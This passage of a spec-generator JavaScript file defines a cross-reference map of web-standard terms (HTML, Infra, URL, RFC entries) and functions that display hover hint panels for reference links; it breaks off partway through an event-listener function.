"https://html.spec.whatwg.org/multipage/dom.html#dom-document-referrer": {"export":true,"for_":["Document"],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"referrer","type":"attribute","url":"https://html.spec.whatwg.org/multipage/dom.html#dom-document-referrer"},
"https://html.spec.whatwg.org/multipage/forms.html#the-form-element": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"form","type":"element","url":"https://html.spec.whatwg.org/multipage/forms.html#the-form-element"},
"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#an-iframe-srcdoc-document": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"an iframe srcdoc document","type":"dfn","url":"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#an-iframe-srcdoc-document"},
"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox": {"export":true,"for_":["iframe"],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"sandbox","type":"element-attr","url":"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox"},
"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-object-data": {"export":true,"for_":["object"],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"data","type":"element-attr","url":"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-object-data"},
"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"embed","type":"element","url":"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element"},
"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"iframe","type":"element","url":"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element"},
"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"object","type":"element","url":"https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element"},
"https://html.spec.whatwg.org/multipage/links.html#ping": {"export":true,"for_":["a","area"],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"ping","type":"element-attr","url":"https://html.spec.whatwg.org/multipage/links.html#ping"},
"https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"associated document","type":"dfn","url":"https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window"},
"https://html.spec.whatwg.org/multipage/nav-history-apis.html#dom-document-2": {"export":true,"for_":["Window"],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"document","type":"attribute","url":"https://html.spec.whatwg.org/multipage/nav-history-apis.html#dom-document-2"},
"https://html.spec.whatwg.org/multipage/nav-history-apis.html#window": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"Window","type":"interface","url":"https://html.spec.whatwg.org/multipage/nav-history-apis.html#window"},
"https://html.spec.whatwg.org/multipage/obsolete.html#frame": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"frame","type":"element","url":"https://html.spec.whatwg.org/multipage/obsolete.html#frame"},
"https://html.spec.whatwg.org/multipage/parsing.html#parse-error-duplicate-attribute": {"export":false,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"duplicate-attribute","type":"dfn","url":"https://html.spec.whatwg.org/multipage/parsing.html#parse-error-duplicate-attribute"},
"https://html.spec.whatwg.org/multipage/scripting.html#script": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"script","type":"element","url":"https://html.spec.whatwg.org/multipage/scripting.html#script"},
"https://html.spec.whatwg.org/multipage/semantics.html#attr-base-href": {"export":true,"for_":["base"],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"href","type":"element-attr","url":"https://html.spec.whatwg.org/multipage/semantics.html#attr-base-href"},
"https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-content": {"export":true,"for_":["meta"],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"content","type":"element-attr","url":"https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-content"},
"https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv": {"export":true,"for_":["meta"],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"http-equiv","type":"element-attr","url":"https://html.spec.whatwg.org/multipage/semantics.html#attr-meta-http-equiv"},
"https://html.spec.whatwg.org/multipage/semantics.html#meta": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"meta","type":"element","url":"https://html.spec.whatwg.org/multipage/semantics.html#meta"},
"https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"set the frozen base url","type":"dfn","url":"https://html.spec.whatwg.org/multipage/semantics.html#set-the-frozen-base-url"},
"https://html.spec.whatwg.org/multipage/semantics.html#the-base-element": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"base","type":"element","url":"https://html.spec.whatwg.org/multipage/semantics.html#the-base-element"},
"https://html.spec.whatwg.org/multipage/semantics.html#the-link-element": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"link","type":"element","url":"https://html.spec.whatwg.org/multipage/semantics.html#the-link-element"},
"https://html.spec.whatwg.org/multipage/semantics.html#the-style-element": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"style","type":"element","url":"https://html.spec.whatwg.org/multipage/semantics.html#the-style-element"},
"https://html.spec.whatwg.org/multipage/semantics.html#update-a-style-block": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"update a style block","type":"dfn","url":"https://html.spec.whatwg.org/multipage/semantics.html#update-a-style-block"},
"https://html.spec.whatwg.org/multipage/text-level-semantics.html#the-a-element": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"a","type":"element","url":"https://html.spec.whatwg.org/multipage/text-level-semantics.html#the-a-element"},
"https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-setinterval": {"export":true,"for_":["WindowOrWorkerGlobalScope"],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"setInterval(handler, timeout, ...arguments)","type":"method","url":"https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-setinterval"},
"https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-settimeout": {"export":true,"for_":["WindowOrWorkerGlobalScope"],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"setTimeout(handler, timeout, ...arguments)","type":"method","url":"https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#dom-settimeout"},
"https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce": {"export":true,"for_":["htmlsvg-global"],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"nonce","type":"element-attr","url":"https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce"},
"https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global": {"export":true,"for_":["environment settings object"],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"global object","type":"dfn","url":"https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global"},
"https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-origin": {"export":true,"for_":["environment settings object"],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"origin","type":"dfn","url":"https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-origin"},
"https://html.spec.whatwg.org/multipage/webappapis.html#current-settings-object": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"current settings object","type":"dfn","url":"https://html.spec.whatwg.org/multipage/webappapis.html#current-settings-object"},
"https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"environment settings object","type":"dfn","url":"https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object"},
"https://html.spec.whatwg.org/multipage/webappapis.html#global-object": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"global object","type":"dfn","url":"https://html.spec.whatwg.org/multipage/webappapis.html#global-object"},
"https://html.spec.whatwg.org/multipage/webappapis.html#queue-a-task": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"queue a task","type":"dfn","url":"https://html.spec.whatwg.org/multipage/webappapis.html#queue-a-task"},
"https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"relevant settings object","type":"dfn","url":"https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object"},
"https://html.spec.whatwg.org/multipage/workers.html#dedicatedworkerglobalscope": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"DedicatedWorkerGlobalScope","type":"interface","url":"https://html.spec.whatwg.org/multipage/workers.html#dedicatedworkerglobalscope"},
"https://html.spec.whatwg.org/multipage/workers.html#run-a-worker": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"run a worker","type":"dfn","url":"https://html.spec.whatwg.org/multipage/workers.html#run-a-worker"},
"https://html.spec.whatwg.org/multipage/workers.html#sharedworker": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"SharedWorker","type":"interface","url":"https://html.spec.whatwg.org/multipage/workers.html#sharedworker"},
"https://html.spec.whatwg.org/multipage/workers.html#sharedworkerglobalscope": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"SharedWorkerGlobalScope","type":"interface","url":"https://html.spec.whatwg.org/multipage/workers.html#sharedworkerglobalscope"},
"https://html.spec.whatwg.org/multipage/workers.html#worker": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"Worker","type":"interface","url":"https://html.spec.whatwg.org/multipage/workers.html#worker"},
"https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"WorkerGlobalScope","type":"interface","url":"https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope"},
"https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"html","spec":"html","status":"current","text":"WorkletGlobalScope","type":"interface","url":"https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope"},
"https://infra.spec.whatwg.org/#": {"export":true,"for_":[],"level":"","normative":true,"shortname":"infra","spec":"infra","status":"anchor-block","text":"infra","type":"grammar","url":"https://infra.spec.whatwg.org/#"},
"https://infra.spec.whatwg.org/#ascii-case-insensitive": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"ascii case-insensitive","type":"dfn","url":"https://infra.spec.whatwg.org/#ascii-case-insensitive"},
"https://infra.spec.whatwg.org/#ascii-lowercase": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"ascii lowercase","type":"dfn","url":"https://infra.spec.whatwg.org/#ascii-lowercase"},
"https://infra.spec.whatwg.org/#ascii-string": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"ascii string","type":"dfn","url":"https://infra.spec.whatwg.org/#ascii-string"},
"https://infra.spec.whatwg.org/#ascii-whitespace": {"export":true,"for_":[],"level":"","normative":true,"shortname":"infra","spec":"infra","status":"anchor-block","text":"ascii whitespace","type":"grammar","url":"https://infra.spec.whatwg.org/#ascii-whitespace"},
"https://infra.spec.whatwg.org/#byte-sequence": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"byte sequence","type":"dfn","url":"https://infra.spec.whatwg.org/#byte-sequence"},
"https://infra.spec.whatwg.org/#collect-a-sequence-of-code-points": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"collecting a sequence of code points","type":"dfn","url":"https://infra.spec.whatwg.org/#collect-a-sequence-of-code-points"},
"https://infra.spec.whatwg.org/#isomorphic-decode": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"isomorphic decode","type":"dfn","url":"https://infra.spec.whatwg.org/#isomorphic-decode"},
"https://infra.spec.whatwg.org/#iteration-continue": {"export":true,"for_":["iteration"],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"continue","type":"dfn","url":"https://infra.spec.whatwg.org/#iteration-continue"},
"https://infra.spec.whatwg.org/#javascript-string-convert": {"export":true,"for_":["string","JavaScript string"],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"convert","type":"dfn","url":"https://infra.spec.whatwg.org/#javascript-string-convert"},
"https://infra.spec.whatwg.org/#list": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"list","type":"dfn","url":"https://infra.spec.whatwg.org/#list"},
"https://infra.spec.whatwg.org/#list-append": {"export":true,"for_":["list"],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"append","type":"dfn","url":"https://infra.spec.whatwg.org/#list-append"},
"https://infra.spec.whatwg.org/#list-contain": {"export":true,"for_":["list","stack","queue","set"],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"contain","type":"dfn","url":"https://infra.spec.whatwg.org/#list-contain"},
"https://infra.spec.whatwg.org/#list-is-empty": {"export":true,"for_":["list","stack","queue","set"],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"is empty","type":"dfn","url":"https://infra.spec.whatwg.org/#list-is-empty"},
"https://infra.spec.whatwg.org/#list-iterate": {"export":true,"for_":["list","set"],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"for each","type":"dfn","url":"https://infra.spec.whatwg.org/#list-iterate"},
"https://infra.spec.whatwg.org/#ordered-map": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"ordered map","type":"dfn","url":"https://infra.spec.whatwg.org/#ordered-map"},
"https://infra.spec.whatwg.org/#ordered-set": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"ordered set","type":"dfn","url":"https://infra.spec.whatwg.org/#ordered-set"},
"https://infra.spec.whatwg.org/#serialize-an-infra-value-to-json-bytes": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"serialize an infra value to json bytes","type":"dfn","url":"https://infra.spec.whatwg.org/#serialize-an-infra-value-to-json-bytes"},
"https://infra.spec.whatwg.org/#set-append": {"export":true,"for_":["set"],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"append","type":"dfn","url":"https://infra.spec.whatwg.org/#set-append"},
"https://infra.spec.whatwg.org/#split-on-ascii-whitespace": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"split a string on ascii whitespace","type":"dfn","url":"https://infra.spec.whatwg.org/#split-on-ascii-whitespace"},
"https://infra.spec.whatwg.org/#split-on-commas": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"split a string on commas","type":"dfn","url":"https://infra.spec.whatwg.org/#split-on-commas"},
"https://infra.spec.whatwg.org/#strictly-split": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"strictly split a string","type":"dfn","url":"https://infra.spec.whatwg.org/#strictly-split"},
"https://infra.spec.whatwg.org/#string": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"string","type":"dfn","url":"https://infra.spec.whatwg.org/#string"},
"https://infra.spec.whatwg.org/#string-is": {"export":true,"for_":["string"],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"is","type":"dfn","url":"https://infra.spec.whatwg.org/#string-is"},
"https://infra.spec.whatwg.org/#strip-leading-and-trailing-ascii-whitespace": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"infra","spec":"infra","status":"current","text":"strip leading and trailing ascii whitespace","type":"dfn","url":"https://infra.spec.whatwg.org/#strip-leading-and-trailing-ascii-whitespace"},
"https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#": {"export":true,"for_":[],"level":"","normative":true,"shortname":"sha2","spec":"sha2","status":"anchor-block","text":"sha-256","type":"dfn","url":"https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#"},
"https://tc39.github.io/ecma262#realm": {"export":true,"for_":[],"level":"","normative":true,"shortname":"ecma262","spec":"ecma262","status":"anchor-block","text":"realm","type":"dfn","url":"https://tc39.github.io/ecma262#realm"},
"https://tc39.github.io/ecma262#sec-eval-x": {"export":true,"for_":[],"level":"","normative":true,"shortname":"ecma262","spec":"ecma262","status":"anchor-block","text":"eval()","type":"method","url":"https://tc39.github.io/ecma262#sec-eval-x"},
"https://tc39.github.io/ecma262#sec-function-objects": {"export":true,"for_":[],"level":"","normative":true,"shortname":"ecma262","spec":"ecma262","status":"anchor-block","text":"Function()","type":"method","url":"https://tc39.github.io/ecma262#sec-function-objects"},
"https://tc39.github.io/ecma262#sec-hostensurecancompilestrings": {"export":true,"for_":[],"level":"","normative":true,"shortname":"ecma262","spec":"ecma262","status":"anchor-block","text":"HostEnsureCanCompileStrings()","type":"method","url":"https://tc39.github.io/ecma262#sec-hostensurecancompilestrings"},
"https://tools.ietf.org/html/rfc3986#section-3.1": {"export":true,"for_":[],"level":"","normative":true,"shortname":"rfc3986","spec":"rfc3986","status":"anchor-block","text":"scheme","type":"grammar","url":"https://tools.ietf.org/html/rfc3986#section-3.1"},
"https://tools.ietf.org/html/rfc3986#section-3.2.2": {"export":true,"for_":[],"level":"","normative":true,"shortname":"rfc3986","spec":"rfc3986","status":"anchor-block","text":"ipv4address","type":"grammar","url":"https://tools.ietf.org/html/rfc3986#section-3.2.2"},
"https://tools.ietf.org/html/rfc3986#section-3.3": {"export":true,"for_":[],"level":"","normative":true,"shortname":"rfc3986","spec":"rfc3986","status":"anchor-block","text":"path-absolute","type":"grammar","url":"https://tools.ietf.org/html/rfc3986#section-3.3"},
"https://tools.ietf.org/html/rfc3986#section-4.1": {"export":true,"for_":[],"level":"","normative":true,"shortname":"rfc3986","spec":"rfc3986","status":"anchor-block","text":"uri-reference","type":"grammar","url":"https://tools.ietf.org/html/rfc3986#section-4.1"},
"https://tools.ietf.org/html/rfc4648#section-4": {"export":true,"for_":[],"level":"","normative":true,"shortname":"rfc4648","spec":"rfc4648","status":"anchor-block","text":"base64 encoding","type":"dfn","url":"https://tools.ietf.org/html/rfc4648#section-4"},
"https://tools.ietf.org/html/rfc4648#section-5": {"export":true,"for_":[],"level":"","normative":true,"shortname":"rfc4648","spec":"rfc4648","status":"anchor-block","text":"base64url encoding","type":"dfn","url":"https://tools.ietf.org/html/rfc4648#section-5"},
"https://tools.ietf.org/html/rfc5234#appendix-B.1": {"export":true,"for_":[],"level":"","normative":true,"shortname":"rfc5234","spec":"rfc5234","status":"anchor-block","text":"alpha","type":"grammar","url":"https://tools.ietf.org/html/rfc5234#appendix-B.1"},
"https://tools.ietf.org/html/rfc7230#section-3.2.3": {"export":true,"for_":[],"level":"","normative":true,"shortname":"rfc7230","spec":"rfc7230","status":"anchor-block","text":"ows","type":"grammar","url":"https://tools.ietf.org/html/rfc7230#section-3.2.3"},
"https://tools.ietf.org/html/rfc7230#section-3.2.6": {"export":true,"for_":[],"level":"","normative":true,"shortname":"rfc7230","spec":"rfc7230","status":"anchor-block","text":"token","type":"grammar","url":"https://tools.ietf.org/html/rfc7230#section-3.2.6"},
"https://tools.ietf.org/html/rfc7231#section-3": {"export":true,"for_":[],"level":"","normative":true,"shortname":"rfc7231","spec":"rfc7231","status":"anchor-block","text":"resource representation","type":"dfn","url":"https://tools.ietf.org/html/rfc7231#section-3"},
"https://url.spec.whatwg.org/#concept-base-url": {"export":false,"for_":[],"level":"1","normative":true,"shortname":"url","spec":"url","status":"current","text":"base url","type":"dfn","url":"https://url.spec.whatwg.org/#concept-base-url"},
"https://url.spec.whatwg.org/#concept-ipv6": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"url","spec":"url","status":"current","text":"ipv6 address","type":"dfn","url":"https://url.spec.whatwg.org/#concept-ipv6"},
"https://url.spec.whatwg.org/#concept-url-host": {"export":true,"for_":["url"],"level":"1","normative":true,"shortname":"url","spec":"url","status":"current","text":"host","type":"dfn","url":"https://url.spec.whatwg.org/#concept-url-host"},
"https://url.spec.whatwg.org/#concept-url-origin": {"export":true,"for_":["url"],"level":"1","normative":true,"shortname":"url","spec":"url","status":"current","text":"origin","type":"dfn","url":"https://url.spec.whatwg.org/#concept-url-origin"},
"https://url.spec.whatwg.org/#concept-url-parser": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"url","spec":"url","status":"current","text":"url parser","type":"dfn","url":"https://url.spec.whatwg.org/#concept-url-parser"},
"https://url.spec.whatwg.org/#concept-url-path": {"export":true,"for_":["url"],"level":"1","normative":true,"shortname":"url","spec":"url","status":"current","text":"path","type":"dfn","url":"https://url.spec.whatwg.org/#concept-url-path"},
"https://url.spec.whatwg.org/#concept-url-port": {"export":true,"for_":["url"],"level":"1","normative":true,"shortname":"url","spec":"url","status":"current","text":"port","type":"dfn","url":"https://url.spec.whatwg.org/#concept-url-port"},
"https://url.spec.whatwg.org/#concept-url-scheme": {"export":true,"for_":["url"],"level":"1","normative":true,"shortname":"url","spec":"url","status":"current","text":"scheme","type":"dfn","url":"https://url.spec.whatwg.org/#concept-url-scheme"},
"https://url.spec.whatwg.org/#concept-url-serializer": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"url","spec":"url","status":"current","text":"url serializer","type":"dfn","url":"https://url.spec.whatwg.org/#concept-url-serializer"},
"https://url.spec.whatwg.org/#default-port": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"url","spec":"url","status":"current","text":"default port","type":"dfn","url":"https://url.spec.whatwg.org/#default-port"},
"https://url.spec.whatwg.org/#dom-url-host": {"export":true,"for_":["URL"],"level":"1","normative":true,"shortname":"url","spec":"url","status":"current","text":"host","type":"attribute","url":"https://url.spec.whatwg.org/#dom-url-host"},
"https://url.spec.whatwg.org/#dom-url-port": {"export":true,"for_":["URL"],"level":"1","normative":true,"shortname":"url","spec":"url","status":"current","text":"port","type":"attribute","url":"https://url.spec.whatwg.org/#dom-url-port"},
"https://url.spec.whatwg.org/#string-percent-decode": {"export":true,"for_":["string"],"level":"1","normative":true,"shortname":"url","spec":"url","status":"current","text":"percent-decode","type":"dfn","url":"https://url.spec.whatwg.org/#string-percent-decode"},
"https://url.spec.whatwg.org/#url": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"url","spec":"url","status":"current","text":"URL","type":"interface","url":"https://url.spec.whatwg.org/#url"},
"https://w3c.github.io/reporting/#group": {"export":true,"for_":[],"level":"","normative":true,"shortname":"reporting","spec":"reporting","status":"anchor-block","text":"group","type":"dfn","url":"https://w3c.github.io/reporting/#group"},
"https://w3c.github.io/reporting/#queue-report": {"export":true,"for_":[],"level":"","normative":true,"shortname":"reporting","spec":"reporting","status":"anchor-block","text":"queue report","type":"dfn","url":"https://w3c.github.io/reporting/#queue-report"},
"https://w3c.github.io/reporting/#report-type": {"export":true,"for_":[],"level":"","normative":true,"shortname":"reporting","spec":"reporting","status":"anchor-block","text":"report type","type":"dfn","url":"https://w3c.github.io/reporting/#report-type"},
"https://w3c.github.io/reporting/#visible-to-reportingobservers": {"export":true,"for_":[],"level":"","normative":true,"shortname":"reporting","spec":"reporting","status":"anchor-block","text":"visible to reportingobservers","type":"dfn","url":"https://w3c.github.io/reporting/#visible-to-reportingobservers"},
"https://webidl.spec.whatwg.org/#Exposed": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"webidl","spec":"webidl","status":"current","text":"Exposed","type":"extended-attribute","url":"https://webidl.spec.whatwg.org/#Exposed"},
"https://webidl.spec.whatwg.org/#idl-DOMString": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"webidl","spec":"webidl","status":"current","text":"DOMString","type":"interface","url":"https://webidl.spec.whatwg.org/#idl-DOMString"},
"https://webidl.spec.whatwg.org/#idl-USVString": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"webidl","spec":"webidl","status":"current","text":"USVString","type":"interface","url":"https://webidl.spec.whatwg.org/#idl-USVString"},
"https://webidl.spec.whatwg.org/#idl-unsigned-long": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"webidl","spec":"webidl","status":"current","text":"unsigned long","type":"interface","url":"https://webidl.spec.whatwg.org/#idl-unsigned-long"},
"https://webidl.spec.whatwg.org/#idl-unsigned-short": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"webidl","spec":"webidl","status":"current","text":"unsigned short","type":"interface","url":"https://webidl.spec.whatwg.org/#idl-unsigned-short"},
"https://www.w3.org/TR/css-cascade-5/#at-ruledef-import": {"export":true,"for_":[],"level":"5","normative":true,"shortname":"css-cascade","spec":"css-cascade-5","status":"snapshot","text":"@import","type":"at-rule","url":"https://www.w3.org/TR/css-cascade-5/#at-ruledef-import"},
"https://www.w3.org/TR/cssom-1/#insert-a-css-rule": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"cssom","spec":"cssom-1","status":"snapshot","text":"insert a css rule","type":"dfn","url":"https://www.w3.org/TR/cssom-1/#insert-a-css-rule"},
"https://www.w3.org/TR/cssom-1/#parse-a-css-declaration-block": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"cssom","spec":"cssom-1","status":"snapshot","text":"parse a css declaration block","type":"dfn","url":"https://www.w3.org/TR/cssom-1/#parse-a-css-declaration-block"},
"https://www.w3.org/TR/cssom-1/#parse-a-css-rule": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"cssom","spec":"cssom-1","status":"snapshot","text":"parse a css rule","type":"dfn","url":"https://www.w3.org/TR/cssom-1/#parse-a-css-rule"},
"https://www.w3.org/TR/cssom-1/#parse-a-group-of-selectors": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"cssom","spec":"cssom-1","status":"snapshot","text":"parse a group of selectors","type":"dfn","url":"https://www.w3.org/TR/cssom-1/#parse-a-group-of-selectors"},
"https://www.w3.org/TR/reporting-1/#reportbody": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"reporting","spec":"reporting-1","status":"snapshot","text":"ReportBody","type":"interface","url":"https://www.w3.org/TR/reporting-1/#reportbody"},
"https://www.w3.org/TR/service-workers/#serviceworker": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"service-workers","spec":"service-workers","status":"snapshot","text":"ServiceWorker","type":"interface","url":"https://www.w3.org/TR/service-workers/#serviceworker"},
"https://www.w3.org/TR/service-workers/#serviceworkerglobalscope": {"export":true,"for_":[],"level":"1","normative":true,"shortname":"service-workers","spec":"service-workers","status":"snapshot","text":"ServiceWorkerGlobalScope","type":"interface","url":"https://www.w3.org/TR/service-workers/#serviceworkerglobalscope"},
};

function mkRefHint(link, ref) {
    const linkText = link.textContent;
    let dfnTextElements = '';
    if (ref.text != linkText) {
        dfnTextElements =
            mk.li({},
                mk.b({}, "Term: "),
                mk.span({}, ref.text)
            );
    }
    const forList = ref.for_;
    let forListElements;
    if(forList.length == 0) {
        forListElements = [];
    } else if(forList.length == 1) {
        forListElements = mk.li({},
            mk.b({}, "For: "),
            mk.span({}, forList[0]),
        );
    } else {
        forListElements = mk.li({},
            mk.b({}, "For: "),
            mk.ul({},
                ...forList.map(forItem =>
                    mk.li({},
                        mk.span({}, forItem)
                    ),
                ),
            ),
        );
    }
    const url = ref.url;
    const safeUrl = encodeURIComponent(url);
    const hintPanel = mk.aside({
        class: "ref-hint",
        id: `ref-hint-for-${safeUrl}`,
        "data-for": url,
        "aria-labelled-by": `ref-hint-for-${safeUrl}`,
    },
        mk.ul({},
            dfnTextElements,
            mk.li({},
                mk.b({}, "URL: "),
                mk.a({ href: url, class: "ref" }, url),
            ),
            mk.li({},
                mk.b({}, "Type: "),
                mk.span({}, `${ref.type}`),
            ),
            mk.li({},
                mk.b({}, "Spec: "),
                mk.span({}, `${ref.spec ? ref.spec : ''}`),
            ),
            forListElements
        ),
    );
    hintPanel.forLink = link;
    setupRefHintEventListeners(link, hintPanel);
    return hintPanel;
}

function hideAllRefHints() {
    queryAll(".ref-hint").forEach(el=>hideRefHint(el));
}

function hideRefHint(refHint) {
    const link = refHint.forLink;
    link.setAttribute("aria-expanded", "false");
    if(refHint.teardownEventListeners) {
        refHint.teardownEventListeners();
    }
    refHint.remove();
}

function showRefHint(link) {
    if(link.classList.contains("dfn-link")) return;
    const url = link.getAttribute("href");
    const ref = refsData[url];
    if(!ref) return;

    hideAllRefHints(); // Only display one at this time.

    const refHint = mkRefHint(link, ref);
    append(document.body, refHint);
    link.setAttribute("aria-expanded", "true");
    positionRefHint(refHint);
}

function setupRefHintEventListeners(link, refHint) {
    if (refHint.teardownEventListeners) return;
    // Add event handlers to hide the refHint after the user moves away
    // from both the link and refHint, if not hovering either within one second.
    let timeout = null;
    const startHidingRefHint = (event) => {
        if (timeout) {
            clearTimeout(timeout);
        }
        timeout = setTimeout(() => {
            hideRefHint(refHint);
        }, 1000);
    }
    const resetHidingRefHint = (event) => {
